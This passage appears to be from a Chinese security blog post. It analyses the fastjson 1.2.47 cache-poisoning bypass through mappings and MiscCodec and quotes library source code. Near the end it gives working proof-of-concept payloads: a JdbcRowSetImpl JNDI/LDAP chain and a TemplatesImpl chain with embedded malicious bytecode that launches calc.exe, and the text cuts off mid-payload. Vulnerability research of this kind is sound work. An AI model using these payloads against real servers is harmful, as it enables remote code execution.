class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addBaseClassMappings</span><span class="params">()</span>&#123;</span><br><span class="line">        mappings.put(<span class="string">&quot;byte&quot;</span>, <span class="type">byte</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;short&quot;</span>, <span class="type">short</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;int&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;long&quot;</span>, <span class="type">long</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;float&quot;</span>, <span class="type">float</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;double&quot;</span>, <span class="type">double</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;boolean&quot;</span>, <span class="type">boolean</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;char&quot;</span>, <span class="type">char</span>.class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[byte&quot;</span>, <span class="type">byte</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[short&quot;</span>, <span class="type">short</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[int&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[long&quot;</span>, <span class="type">long</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[float&quot;</span>, <span class="type">float</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[double&quot;</span>, <span class="type">double</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[boolean&quot;</span>, <span class="type">boolean</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[char&quot;</span>, <span class="type">char</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[B&quot;</span>, <span class="type">byte</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[S&quot;</span>, <span class="type">short</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[I&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[J&quot;</span>, <span class="type">long</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[F&quot;</span>, <span class="type">float</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[D&quot;</span>, <span class="type">double</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[C&quot;</span>, <span class="type">char</span>[].class);</span><br><span class="line">        mappings.put(<span class="string">&quot;[Z&quot;</span>, <span class="type">boolean</span>[].class);</span><br><span class="line">        Class&lt;?&gt;[] classes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                java.lang.Cloneable.class,</span><br><span class="line">                loadClass(<span class="string">&quot;java.lang.AutoCloseable&quot;</span>),</span><br><span class="line">                java.lang.Exception.class,</span><br><span class="line">                java.lang.RuntimeException.class,</span><br><span class="line">                java.lang.IllegalAccessError.class,</span><br><span class="line">                java.lang.IllegalAccessException.class,</span><br><span class="line">                java.lang.IllegalArgumentException.class,</span><br><span class="line">                java.lang.IllegalMonitorStateException.class,</span><br><span class="line">                java.lang.IllegalStateException.class,</span><br><span class="line">                java.lang.IllegalThreadStateException.class,</span><br><span class="line">                java.lang.IndexOutOfBoundsException.class,</span><br><span class="line">                java.lang.InstantiationError.class,</span><br><span class="line">                java.lang.InstantiationException.class,</span><br><span class="line">                java.lang.InternalError.class,</span><br><span class="line">                java.lang.InterruptedException.class,</span><br><span class="line">                java.lang.LinkageError.class,</span><br><span class="line">                java.lang.NegativeArraySizeException.class,</span><br><span class="line">                java.lang.NoClassDefFoundError.class,</span><br><span class="line">                java.lang.NoSuchFieldError.class,</span><br><span class="line">                java.lang.NoSuchFieldException.class,</span><br><span class="line">                java.lang.NoSuchMethodError.class,</span><br><span class="line">                java.lang.NoSuchMethodException.class,</span><br><span class="line">                java.lang.NullPointerException.class,</span><br><span class="line">                java.lang.NumberFormatException.class,</span><br><span class="line">                java.lang.OutOfMemoryError.class,</span><br><span class="line">                java.lang.SecurityException.class,</span><br><span class="line">                java.lang.StackOverflowError.class,</span><br><span class="line">                java.lang.StringIndexOutOfBoundsException.class,</span><br><span class="line">                java.lang.TypeNotPresentException.class,</span><br><span class="line">                java.lang.VerifyError.class,</span><br><span class="line">                java.lang.StackTraceElement.class,</span><br><span class="line">                java.util.HashMap.class,</span><br><span class="line">                java.util.Hashtable.class,</span><br><span class="line">                java.util.TreeMap.class,</span><br><span class="line">                java.util.IdentityHashMap.class,</span><br><span class="line">                java.util.WeakHashMap.class,</span><br><span class="line">                java.util.LinkedHashMap.class,</span><br><span class="line">                java.util.HashSet.class,</span><br><span class="line">                java.util.LinkedHashSet.class,</span><br><span class="line">                java.util.TreeSet.class,</span><br><span class="line">                java.util.concurrent.TimeUnit.class,</span><br><span class="line">                java.util.concurrent.ConcurrentHashMap.class,</span><br><span class="line">                loadClass(<span class="string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span>),</span><br><span class="line">                loadClass(<span class="string">&quot;java.util.concurrent.ConcurrentSkipListSet&quot;</span>),</span><br><span class="line">                java.util.concurrent.atomic.AtomicInteger.class,</span><br><span class="line">                java.util.concurrent.atomic.AtomicLong.class,</span><br><span class="line">                java.util.Collections.EMPTY_MAP.getClass(),</span><br><span class="line">                java.util.BitSet.class,</span><br><span class="line">                java.util.Calendar.class,</span><br><span class="line">                java.util.Date.class,</span><br><span class="line">                java.util.Locale.class,</span><br><span class="line">                java.util.UUID.class,</span><br><span class="line">                java.sql.Time.class,</span><br><span class="line">                java.sql.Date.class,</span><br><span class="line">                java.sql.Timestamp.class,</span><br><span class="line">                java.text.SimpleDateFormat.class,</span><br><span class="line">                com.alibaba.fastjson.JSONObject.class,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span>(Class clazz : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] awt = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;java.awt.Rectangle&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.awt.Point&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.awt.Font&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.awt.Color&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : awt)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);</span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] spring = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;org.springframework.util.LinkedMultiValueMap&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.util.LinkedCaseInsensitiveMap&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.remoting.support.RemoteInvocation&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.remoting.support.RemoteInvocationResult&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.web.savedrequest.DefaultSavedRequest&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.web.savedrequest.SavedCookie&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.web.csrf.DefaultCsrfToken&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.web.authentication.WebAuthenticationDetails&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.core.context.SecurityContextImpl&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.authentication.UsernamePasswordAuthenticationToken&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.core.authority.SimpleGrantedAuthority&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.springframework.security.core.userdetails.User&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : spring)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);</span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到mappings下有这些对象</p><p>接着看deserializers.findClass方法，deserializers是一个IdentityHashMap对象：</p><p><img src="/archives/1970b414/image-20250927134336560.png" alt="image-20250927134336560"></p><p>bucket用于储存键值对，这里指从deserializers遍历获取对应的Class对象，而ParserConfig提供了initDeserializers()设置deserializers中buckets值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">        deserializers.put(SimpleDateFormat.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);</span><br><span class="line">        deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);</span><br><span class="line">        deserializers.put(java.sql.Time.class, TimeDeserializer.instance);</span><br><span class="line">        deserializers.put(java.util.Date.class, DateCodec.instance);</span><br><span class="line">        deserializers.put(Calendar.class, CalendarCodec.instance);</span><br><span class="line">        deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(JSONObject.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(JSONArray.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Map.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(HashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(LinkedHashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(TreeMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Collection.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(List.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(ArrayList.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Object.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(String.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuffer.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuilder.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(Character.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">byte</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Byte.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">short</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Short.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">int</span>.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(Integer.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">long</span>.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(Long.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(BigInteger.class, BigIntegerCodec.instance);</span><br><span class="line">        deserializers.put(BigDecimal.class, BigDecimalCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">float</span>.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(Float.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">double</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Double.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>[].class, <span class="keyword">new</span> <span class="title class_">CharArrayCodec</span>());</span><br><span class="line"></span><br><span class="line">        deserializers.put(AtomicBoolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(AtomicInteger.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLong.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(AtomicReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(WeakReference.class, ReferenceCodec.instance);</span><br><span class="line">        deserializers.put(SoftReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(JSONPath.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Number.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLongArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Serializable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Comparable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Closeable.class, JavaObjectDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(JSONPObject.class, <span class="keyword">new</span> <span class="title class_">JSONPDeserializer</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以我们现在的思路很明确，就是能否将恶意对象添加进mappings或者deserializers使最后加载我们的恶意对象</p><p>首先看mappings：</p><p>看哪个地方调用了mappings.put方法，除了初始化外TypeUtils.loadClass也调用了该方法，就是一开始实例化类的方法：</p><p><img src="/archives/1970b414/image-20250927135825437.png" alt="image-20250927135825437"></p><p><img src="/archives/1970b414/image-20250927135945768.png" alt="image-20250927135945768"></p><p>提供了三种方式加载类，成功就将结果存入mappings缓存</p><p>然后就是deserializers，除了initDeserializer还有putDeserializer方法也调用了：</p><p><img src="/archives/1970b414/image-20250927140603988.png" alt="image-20250927140603988"></p><p>这个方法在getDeserializer方法中调用，其中这两个参数由getDeserializer方法方法内控制，getDeserializer方法中，大部分不可控，可控部分都需要对clazz做类型检测</p><p>所以这里不考虑，现在我们的目的是通过TypeUtils.loadClass方法来将恶意类添加到mappings缓存，搜索下哪里调用了该方法：<br><img src="/archives/1970b414/image-20250927141255677.png" alt="image-20250927141255677"></p><p>可以看到MiscCodec类中也调用了该方法，定位到MiscCodec#deserialze方法：<br><img src="/archives/1970b414/image-20250927141510893.png" alt="image-20250927141510893"></p><p>当clazz类型是Class类型时会调用TypeUtils.loadClass方法，clazz是deserialze传入的对象的类型</p><p><img src="/archives/1970b414/image-20250927141823550.png" alt="image-20250927141823550"></p><p>而strVal由objVal控制：</p><p><img src="/archives/1970b414/image-20250927141939393.png" alt="image-20250927141939393"></p><p>objVal又是通过parse.parse()方式获得</p><p>前面我们分析反序列化流程时知道一般deserialze方法是在DefaultJSONParser中，通过deserializer.deserialze方法进行调用</p><p><img src="/archives/1970b414/image-20250927142350181.png" alt="image-20250927142350181"></p><p>这里我们进行测试，我们先实现前提就是要能调用MiscCodec#deseriale方法，同时需要确保clazz类型为Class类型，这里反序列化器是通过getDeserializer获得的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(<span class="type">char</span>[].class, <span class="keyword">new</span> <span class="title class_">CharArrayCodec</span>());</span><br><span class="line">deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(JSONPath.class, MiscCodec.instance);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;b1uel0n3\&quot;:\&quot;b1uel0n3\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250927144317091.png" alt="image-20250927144317091"></p><p>调用到了MiscCodec对象的deserialze方法，回到objVal赋值位置，结果提示需要键名为val，不然会抛出错误：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;b1uel0n3\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250927145559242.png" alt="image-20250927145559242"></p><p>接着往下：</p><p><img src="/archives/1970b414/image-20250927145651948.png" alt="image-20250927145651948"></p><p>会调用TypeUtils.loadClass方法，他调用了另一个重载方法，classLoader默认为null，<strong>cache默认为true</strong>:</p><p><img src="/archives/1970b414/image-20250927150512873.png" alt="image-20250927150512873"></p><p>他会判断mappings是否缓存过这个类，如果有直接返回</p><p>获取类加载器加载类，由于cache为true，则会通过mapping.put方法向mapping添加新的class:<br><img src="/archives/1970b414/image-20250927150653336.png" alt="image-20250927150653336"></p><p>然后我们再反序列化恶意对象，由于已经缓存进mapping，则会从mapping直接返回，从而避开黑白名单的限制</p><h2 id="mappings添加恶意类利用流程总结"><a href="#mappings添加恶意类利用流程总结" class="headerlink" title="mappings添加恶意类利用流程总结"></a>mappings添加恶意类利用流程总结</h2><p>这里我们简单总结一下添加mapping的操作</p><p>首先是checkAutoType方法检查逻辑，针对1.2.47版本：</p><ul><li>如果AutoType未开启，会先通过查找mappings和deserializers缓存过的类，如果所以实例化的类被找到，则直接返回对应的Class对象</li><li>如果AutoType开启，当反序列化的类在黑名单中，且mappings中没有该类的缓存时，会抛出异常</li></ul><p>而1.2.47版本默认不开启AutoType</p><p>这时我们的流程就是利用parse会执行deserializer.deserialze方法触发<strong>MiscCodec#deserialze</strong>方法，注意clazz为Class类型，同时strVal由objVal赋值，因为objVal最后反序列化后的值为val的值，所以需要传入val变量为我们的恶意类使其最后调用TypeUtils.loadClass方法时将我们的恶意类添加进mappings缓存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>所以需要一次实例化两个对象，一个用于将恶意类设置进mappings，另一个则直接触发漏洞</p><p>解析流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解析键&quot;1&quot; → 检查@type1 → 反序列化对象1 → 污染缓存</span><br><span class="line">解析键&quot;2&quot; → 检查@type2 → 失败 → 异常 → 重试 → 缓存命中 → 成功</span><br></pre></td></tr></table></figure><p>JdbcRowSetImpl链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>TemplatesImpl链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAB